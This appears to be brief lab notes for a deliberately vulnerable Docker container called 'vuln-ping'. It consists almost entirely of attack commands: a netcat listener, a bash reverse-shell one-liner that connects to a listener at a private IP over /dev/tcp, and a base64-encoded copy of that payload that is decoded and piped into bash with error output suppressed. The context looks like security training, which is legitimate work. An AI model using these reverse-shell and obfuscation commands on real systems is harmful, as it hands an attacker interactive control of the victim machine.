# docker
```bash
docker build -t vuln-ping .
```

# Listen for incoming connections
```bash
sudo nc -nvl 1338
```

# Connect to the listener
```bash
echo "bash -c 'bash -i >& /dev/tcp/192.168.178.113/1338 0>&1'" | base64
echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3OC4xMTMvMTMzOCAwPiYxJwo= | base64 -d | bash 2>/dev/null
```
